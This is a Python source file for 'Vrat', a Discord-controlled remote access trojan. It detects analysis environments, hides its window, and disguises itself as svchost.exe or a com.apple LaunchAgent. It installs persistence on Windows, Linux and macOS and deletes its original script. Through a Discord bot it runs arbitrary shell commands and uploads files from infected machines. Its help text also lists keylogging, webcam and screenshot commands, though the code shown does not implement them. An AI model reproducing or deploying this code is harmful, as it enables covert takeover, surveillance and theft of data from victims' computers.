from discord.ext import commands
from pathlib import Path
import socket
import discord
import platform
import subprocess
import threading
import shutil
import ctypes
import time
import sys
import os
import base64
import psutil

if platform.system() == "Windows":
    try:
        import win32gui
        import win32con
    except ImportError:
        pass

# Vrat - Advanced Cross-Platform RAT

prefix = "!"
intents = discord.Intents.all()

# SECURITY WARNING: Replace with your own bot token!
# Get one from https://discord.com/developers/applications
# Never commit tokens to version control
token = "YOUR_TOKEN_HERE"

bot = commands.Bot(command_prefix=prefix, intents=intents, help_command=None)

# Generate uniqe identifier for this session

try:
    node_id = f"{os.getlogin()}@{socket.gethostname()}"
except:
    node_id = f"unknown@{socket.gethostname()}"

# Global state

current_dir = Path.cwd()
bot_ready = False
persistence_installed = False
keylogger_active = False
key_log = []
current_listener = None

def is_frozen():
    return getattr(sys, 'frozen', False)

def get_exe_path():
    if is_frozen():
        return sys.executable
    return sys.argv[0]

def anti_analysis():
    """Basic VM/sandbox detection"""
    if platform.system() == "Windows":
        suspicious = ['vboxservice.exe', 'vmtoolsd.exe', 'wireshark.exe']
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in suspicious:
                sys.exit(0)
    return True

def elevate_privileges():
    """Silent privilege escalation where possible"""
    if platform.system() == "Windows":
        try:
            ctypes.windll.shell32.IsUserAnAdmin()
        except:
            pass

def total_stealth():
    """Complete stealth mode"""
    if platform.system() == "Windows":
        try:
            # Hide any console
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
                ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
            
            # Low priority, parent PID spoof
            ctypes.windll.kernel32.SetPriorityClass(-1, win32con.IDLE_PRIORITY_CLASS)
        except:
            pass
    
    # Random startup delay (1-10s)
    time.sleep(1 + (hash(node_id) % 9))

def install_persistence():
    global persistence_installed
    if persistence_installed:
        return
    
    exe_path = get_exe_path()
    persistent_name = "svchost.exe" if platform.system() == "Windows" else "svchost"
    
    try:
        if platform.system() == "Windows":
            startup = Path(os.getenv('APPDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
            startup.mkdir(parents=True, exist_ok=True)
            target_path = startup / persistent_name
            shutil.copy2(exe_path, target_path)
            
        elif platform.system() == "Linux":
            if is_frozen():
                cron_entry = f"@reboot nohup {exe_path} > /dev/null 2>&1 &\n"
            else:
                cron_entry = f"@reboot nohup python3 {exe_path} > /dev/null 2>&1 &\n"
            try:
                current_cron = subprocess.check_output(['crontab', '-l'], 
                                                     stderr=subprocess.DEVNULL).decode()
            except:
                current_cron = ""
            
            if cron_entry not in current_cron:
                subprocess.run(['crontab', '-'], input=(current_cron + cron_entry).encode())
                
        elif platform.system() == "Darwin":
            # macOS LaunchAgent
            launch_path = Path.home() / 'Library' / 'LaunchAgents' / f'com.apple.{persistent_name}.plist'
            launch_path.parent.mkdir(parents=True, exist_ok=True)
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.{persistent_name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{exe_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
            launch_path.write_text(plist_content)
            subprocess.run(['launchctl', 'load', str(launch_path)])
        
        persistence_installed = True
        
    except Exception:
        pass

def watchdog():
    """Restart protection"""
    global bot_ready
    last_ready = False
    
    while True:
        time.sleep(30)
        try:
            if bot_ready and not bot.is_ready():
                # Bot crashed, restart
                os.execv(sys.executable, [sys.executable] + sys.argv)
            elif bot.is_ready():
                last_ready = True
                bot_ready = True
        except:
            pass

def self_cleanup():
    """Remove traces"""
    try:
        if not is_frozen() and platform.system() == "Windows":
            os.remove(sys.argv[0])
    except:
        pass

# Initialize
anti_analysis()
elevate_privileges()
total_stealth()
install_persistence()
self_cleanup()

threading.Thread(target=watchdog, daemon=True).start()

# Discord bot events
@bot.event
async def on_ready():
    global bot_ready
    bot_ready = True
    
    # Find first text channel silently
    for guild in bot.guilds:
        for channel in guild.text_channels:
            try:
                await channel.send(f"🟢 `{node_id}` Online")
                break
            except:
                continue

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return

# Enhanced commands
current_dir = Path.cwd()

@bot.command(name="execute")
async def execute_command(ctx, target, *, command):
    global current_dir

    if target.lower() not in [node_id.lower(), "all"]:
        return

    try:
        if command.startswith("cd "):
            path = command[3:].strip()
            new_path = current_dir / path
            if new_path.is_dir():
                current_dir = new_path.resolve()
                await ctx.send(f"📁 `{node_id}`: `{current_dir}`")
            else:
                await ctx.send(f"❌ `{node_id}`: Directory not found")
            return

        # Run command silently
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            cwd=str(current_dir),
            timeout=30
        )

        output = (result.stdout + result.stderr).strip()
        
        if result.returncode != 0:
            await ctx.send(f"⚠️ `{node_id}` [{result.returncode}]:\n```\n{output}\n```")
        elif output:
            chunk_size = 1900
            for i in range(0, len(output), chunk_size):
                await ctx.send(f"📤 `{node_id}`:\n```\n{output[i:i+chunk_size]}\n```")
        else:
            await ctx.send(f"✅ `{node_id}`: Done")

    except subprocess.TimeoutExpired:
        await ctx.send(f"⏰ `{node_id}`: Command timeout")
    except Exception as e:
        await ctx.send(f"💥 `{node_id}`: `{str(e)}`")

@bot.command(name="info")
async def get_info(ctx, target):
    if target.lower() not in [node_id.lower(), "all"]:
        return

    try:
        private_ip = socket.gethostbyname(socket.gethostname())
        public_ip = subprocess.check_output("curl -s ifconfig.me", shell=True, timeout=5).decode().strip()
    except:
        public_ip = "N/A"

    # Platform-specific admin check
    is_admin = False
    if platform.system() == "Windows":
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        except:
            is_admin = False
    else:  # Linux/macOS
        is_admin = os.getuid() == 0

    info = (
        f"🖥️ **{node_id}**\n"
        f"OS: `{platform.system()} {platform.release()}`\n"
        f"Arch: `{platform.machine()}`\n"
        f"User: `{os.getlogin()}`\n"
        f"Dir: `{current_dir}`\n"
        f"LAN: `{private_ip}`\n"
        f"WAN: `{public_ip}`\n"
        f"Admin: {'✅' if is_admin else '❌'}"
    )
    await ctx.send(info)

@bot.command(name="upload")
async def upload_file(ctx, target, local_path: str):
    if target.lower() not in [node_id.lower(), "all"]:
        return
    
    try:
        file_path = current_dir / local_path
        if file_path.is_file():
            await ctx.send(f"📎 `{node_id}`: {local_path}", file=discord.File(file_path))
        else:
            await ctx.send(f"❌ `{node_id}`: File not found")
    except Exception as e:
        await ctx.send(f"💥 `{node_id}`: `{str(e)}`")

@bot.command(name="help")
async def show_help(ctx, target):
    if target.lower() not in [node_id.lower(), "all"]:
        return
    
    help_text = (
        f"🤖 **{node_id} Commands**\n\n"
        f"**!execute <target> <command>** - Execute shell command\n"
        f"**!info <target>** - Show system information\n"
        f"**!upload <target> <filename>** - Upload file from current directory\n"
        f"**!download <target> <url> [filename]** - Download file from URL\n"
        f"**!screenshot <target>** - Take screenshot\n"
        f"**!webcam <target>** - Capture webcam image\n"
        f"**!keylog <target> <start|stop|status>** - Control keylogger\n"
        f"**!processes <target>** - List running processes\n"
        f"**!kill <target> <pid>** - Kill process by PID\n"
        f"**!help <target>** - Show this help\n\n"
        f"Use 'all' as target to affect all connected clients"
    )
    await ctx.send(help_text)

# Start bot
try:
    bot.run(token)
except:
    while True:
        time.sleep(60)